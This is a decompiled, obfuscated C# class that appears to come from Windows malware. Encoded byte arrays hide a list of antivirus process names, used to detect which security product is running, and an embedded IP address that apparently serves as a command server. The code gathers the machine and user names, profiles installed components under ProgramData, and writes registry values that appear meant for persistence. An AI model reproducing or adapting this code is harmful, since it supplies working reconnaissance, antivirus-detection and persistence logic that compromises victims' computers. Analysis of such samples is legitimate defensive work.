using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ns6;

internal static class Class11
{
	public const string string_0 = "wdlhagaria$doladat";

	public static string string_1;

	public static byte[] byte_0;

	public static string string_2;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	public static byte[] byte_1;

	public static int int_0;

	public static RegistryKey registryKey_0;

	public static int[] int_1;

	public static string string_10;

	public static string string_11;

	public static string string_12;

	public static string string_13;

	public static string string_14;

	public static string string_15;

	public static string string_16;

	public static string string_17;

	public static string string_18;

	public static string string_19;

	public static string string_20;

	public static string string_21;

	public static string string_22;

	public static string string_23;

	[NonSerialized]
	internal static GetString getString_0;

	public static string smethod_0()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + string_20;
	}

	public static byte[] smethod_1(string string_24)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(string_24);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string smethod_2()
	{
		return Path.GetDirectoryName(string_1) + getString_0(107395041);
	}

	public static void smethod_3()
	{
		string_10 = getString_0(107395036).Split(new char[1] { '!' })[0];
		string_11 = Environment.MachineName;
		string_12 = Environment.UserName;
	}

	public static string smethod_4()
	{
		string text = getString_0(107396717);
		try
		{
			Process[] processes = Process.GetProcesses();
			string[] array = Encoding.UTF8.GetString(byte_0, 0, byte_0.Length).Split(new char[1] { ',' });
			for (int i = 0; i < processes.Length; i++)
			{
				string value = processes[i].ProcessName.ToLower();
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].Contains(value))
					{
						string[] array2 = array[j].Split(new char[1] { '=' });
						text = text + getString_0(107394995) + array2[1].Trim();
					}
				}
			}
			return text;
		}
		catch
		{
			return getString_0(107396717);
		}
	}

	public static string smethod_5()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + string_2;
	}

	public static string smethod_6()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + string_18;
	}

	public static byte[] smethod_7()
	{
		try
		{
			string text = getString_0(107396717);
			string text2 = getString_0(107394990).Split(new char[1] { '|' })[0];
			string text3 = getString_0(107394969).Split(new char[1] { '!' })[0];
			text = getString_0(107394984).Split(new char[1] { '!' })[0] + string_10 + getString_0(107394951).Split(new char[1] { '!' })[0] + string_8 + getString_0(107394386).Split(new char[1] { '!' })[0] + smethod_2() + getString_0(107394397).Split(new char[1] { '!' })[0] + getString_0(107394372).Split(new char[1] { '!' })[0] + string_9 + getString_0(107396759).Split(new char[1] { '|' })[0];
			if (File.Exists(smethod_6() + string_7 + getString_0(107396716).Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(smethod_6() + string_7 + getString_0(107396716).Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName = Process.GetProcessesByName(string_7);
				text3 = ((processesByName.Length != 0) ? getString_0(107394290).Split(new char[1] { '!' })[0] : getString_0(107394315).Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = getString_0(107394301).Split(new char[1] { '!' })[0];
				text3 = getString_0(107394280).Split(new char[1] { '!' })[0];
			}
			text = text + getString_0(107394223).Split(new char[1] { '!' })[0] + text3 + getString_0(107394234).Split(new char[1] { '!' })[0] + text2 + getString_0(107394951).Split(new char[1] { '!' })[0] + string_7 + getString_0(107394386).Split(new char[1] { '!' })[0] + smethod_6() + getString_0(107394217).Split(new char[1] { '!' })[0] + string_7 + getString_0(107396759).Split(new char[1] { '|' })[0];
			if (File.Exists(smethod_8() + string_5 + getString_0(107396716).Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(smethod_8() + string_5 + getString_0(107396716).Split(new char[1] { '!' })[0]).ProductVersion;
				text3 = getString_0(107394160).Split(new char[1] { '!' })[0];
			}
			else
			{
				text2 = getString_0(107394301).Split(new char[1] { '!' })[0];
				text3 = getString_0(107394280).Split(new char[1] { '!' })[0];
			}
			text = text + getString_0(107394171).Split(new char[1] { '!' })[0] + text3 + getString_0(107394234).Split(new char[1] { '!' })[0] + text2 + getString_0(107394951).Split(new char[1] { '!' })[0] + string_5 + getString_0(107394386).Split(new char[1] { '!' })[0] + smethod_8() + getString_0(107394217).Split(new char[1] { '!' })[0] + string_5 + getString_0(107396759).Split(new char[1] { '|' })[0];
			if (File.Exists(smethod_0() + string_15 + getString_0(107396716).Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(smethod_0() + string_15 + getString_0(107396716).Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName2 = Process.GetProcessesByName(string_15);
				text3 = ((processesByName2.Length != 0) ? getString_0(107394290).Split(new char[1] { '!' })[0] : getString_0(107394315).Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = getString_0(107394301).Split(new char[1] { '!' })[0];
				text3 = getString_0(107394280).Split(new char[1] { '!' })[0];
			}
			text = text + getString_0(107394662).Split(new char[1] { '!' })[0] + text3 + getString_0(107394234).Split(new char[1] { '!' })[0] + text2 + getString_0(107394951).Split(new char[1] { '!' })[0] + string_15 + getString_0(107394386).Split(new char[1] { '!' })[0] + smethod_0() + getString_0(107394217).Split(new char[1] { '!' })[0] + string_15 + getString_0(107396759).Split(new char[1] { '|' })[0];
			if (File.Exists(smethod_5() + string_19 + getString_0(107396716).Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(smethod_5() + string_19 + getString_0(107396716).Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName3 = Process.GetProcessesByName(string_19);
				text3 = ((processesByName3.Length != 0) ? getString_0(107394290).Split(new char[1] { '!' })[0] : getString_0(107394315).Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = getString_0(107394301).Split(new char[1] { '!' })[0];
				text3 = getString_0(107394280).Split(new char[1] { '!' })[0];
			}
			text = text + getString_0(107394609).Split(new char[1] { '!' })[0] + text3 + getString_0(107394234).Split(new char[1] { '!' })[0] + text2 + getString_0(107394951).Split(new char[1] { '!' })[0] + string_19 + getString_0(107394386).Split(new char[1] { '!' })[0] + smethod_5() + getString_0(107394217).Split(new char[1] { '!' })[0] + string_19 + getString_0(107394620).Split(new char[1] { '!' })[0] + string_4 + getString_0(107396759).Split(new char[1] { '|' })[0];
			return smethod_1(text);
		}
		catch
		{
			return null;
		}
	}

	public static string smethod_8()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + string_23;
	}

	public static void smethod_9(string string_24, string string_25)
	{
		try
		{
			string text = getString_0(107394599);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
			object value = registryKey.GetValue(string_9 + string_24);
			if (value == null)
			{
				registryKey.SetValue(string_9 + string_24, string_25);
			}
			else if (value.ToString() != string_25)
			{
				registryKey.SetValue(string_9 + string_24, string_25);
			}
		}
		catch
		{
		}
	}

	public static string smethod_10()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + getString_0(107396654) + oSVersion.Version.Minor;
		}
		catch
		{
			return getString_0(107394526).Split(new char[1] { '!' })[0];
		}
	}

	static Class11()
	{
		Strings.CreateGetStringDelegate(typeof(Class11));
		bool bool_ = false;
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Uri uri = new Uri(executingAssembly.CodeBase!.Replace(getString_0(107396895), getString_0(107396890)).Replace(getString_0(107396853), getString_0(107396848)));
		if (!StrongNameSignatureVerificationEx(uri.LocalPath, bool_0: true, out bool_) || !bool_ || !executingAssembly.FullName!.EndsWith(getString_0(107396843)))
		{
			throw new SecurityException(getString_0(107396818));
		}
		string_1 = Application.get_ExecutablePath();
		byte_0 = new byte[202]
		{
			98, 100, 115, 115, 61, 66, 46, 68, 101, 102,
			44, 111, 110, 108, 105, 110, 101, 110, 116, 61,
			81, 45, 72, 65, 76, 44, 98, 100, 97, 103,
			101, 110, 116, 61, 66, 68, 65, 103, 101, 110,
			116, 44, 109, 115, 115, 101, 99, 101, 115, 61,
			77, 83, 32, 69, 115, 115, 101, 110, 116, 105,
			97, 108, 115, 44, 102, 115, 115, 109, 51, 50,
			61, 70, 83, 101, 99, 117, 114, 101, 44, 97,
			118, 112, 61, 75, 97, 115, 112, 101, 114, 115,
			107, 121, 44, 97, 118, 103, 110, 116, 61, 65,
			118, 105, 114, 97, 44, 115, 112, 98, 98, 99,
			115, 118, 99, 61, 83, 121, 109, 97, 110, 116,
			101, 99, 44, 117, 112, 100, 97, 116, 101, 114,
			117, 105, 61, 77, 99, 65, 102, 101, 101, 44,
			97, 118, 103, 117, 105, 61, 65, 86, 71, 44,
			97, 118, 103, 99, 99, 61, 65, 86, 71, 44,
			109, 98, 97, 109, 61, 65, 110, 116, 32, 77,
			97, 108, 119, 97, 114, 101, 44, 97, 118, 97,
			115, 116, 117, 105, 61, 65, 118, 97, 115, 116,
			44, 97, 118, 97, 115, 116, 61, 65, 118, 97,
			115, 116
		};
		string_2 = getString_0(107394477).Split(new char[1] { '|' })[0];
		string_3 = getString_0(107394452).Split(new char[1] { '|' })[0];
		string_4 = getString_0(107394467).Split(new char[1] { '|' })[0];
		string_5 = getString_0(107394418).Split(new char[1] { '|' })[0];
		string_6 = getString_0(107394429).Split(new char[1] { '|' })[0];
		string_7 = getString_0(107393892).Split(new char[1] { '|' })[0];
		string_8 = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());
		string_9 = getString_0(107393839).Split(new char[1] { '|' })[0];
		byte_1 = new byte[14]
		{
			49, 56, 53, 46, 49, 52, 48, 46, 53, 51,
			46, 50, 50, 49
		};
		int_0 = 71;
		registryKey_0 = null;
		int_1 = new int[5] { 3489, 9922, 20321, 89, 71 };
		string_11 = getString_0(107396717);
		string_12 = getString_0(107396717);
		string_13 = getString_0(107396717);
		string_14 = getString_0(107396717);
		string_15 = getString_0(107393854).Split(new char[1] { '|' })[0];
		string_16 = getString_0(107393833).Split(new char[1] { '|' })[0];
		string_17 = getString_0(107393800).Split(new char[1] { '|' })[0];
		string_18 = getString_0(107393747).Split(new char[1] { '|' })[0];
		string_19 = getString_0(107393754).Split(new char[1] { '|' })[0];
		string_20 = getString_0(107393733).Split(new char[1] { '|' })[0];
		string_21 = getString_0(107393676).Split(new char[1] { '|' })[0];
		string_22 = getString_0(107393667).Split(new char[1] { '|' })[0];
		string_23 = getString_0(107394150).Split(new char[1] { '|' })[0];
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool StrongNameSignatureVerificationEx([MarshalAs(UnmanagedType.LPWStr)] string string_24, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);
}
